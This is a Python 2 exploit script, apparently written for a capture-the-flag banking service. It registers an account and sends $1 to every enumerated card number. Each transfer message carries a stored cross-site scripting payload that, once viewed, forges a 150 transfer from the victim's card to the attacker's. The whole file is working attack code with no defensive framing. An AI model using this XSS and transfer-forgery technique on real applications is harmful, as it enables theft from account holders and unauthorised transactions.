import requests
import re
import json

s = requests.Session()

baseurl = 'http://10.0.23.24:7777/'

register_data = {
'username': 'haxx0r',
'password': '12345678'
}

#register
response = s.post(baseurl + 'register', data = register_data)

#login
response = s.post(baseurl + 'login', data = register_data)

#regex to look for meta redirects
regex = re.compile('<meta[^>]*?url=(.*?)["\']', re.IGNORECASE)

match = regex.search(response.text)

while match: #loop for redirecting until logged in
    response = s.get(baseurl + match.groups()[0].strip())
    match = regex.search(response.text)

#register a card
response = s.post(baseurl + '/index/cardRegister', data = {'register' : 'true'})

#the response is a json that contains the created card number
data = json.loads(response.text) 

#gets my card number
mycard = int(str(data["card_number"])[-4:]) 

#function that returns the number of 0's remaining on the card number
def zeros(n):
	ret=0
	while n >= 10:
		ret += 1
		n /= 10
	return ret

print "Sending $1 to every other card in the bank..."

#loop that sends $1 to every other card in the bank
for x in xrange(1,mycard):
	card = "1337" + ("0" * (11 - zeros(x))) + str(x)
	script = '''
	'></input><script>
	if (document.getElementsByName('from_card')[0][1] != undefined){
		var request = new XMLHttpRequest();
			request.open('POST', 'card2card/submit', true);
			var formData = new FormData();
			formData.append('from_card', document.getElementsByName('from_card')[0][1].value);
			formData.append('to_card', "'''+ str(data["card_number"]) +'''");
		    formData.append('amount', '150');
		    formData.append('message', 'Here is your money.');
			request.send(formData);
	
	}
	</script><i '
	'''

	transfer_data = {
	'from_card' : str(data["card_number"]),
	'to_card' : card,
	'amount' : '1',
	'message' : script
	}

	print str(data["card_number"]) + " => " + card

	s.post(baseurl + '/card2card/submit', data = transfer_data)

print "All transactions sent, now just wait for the money!"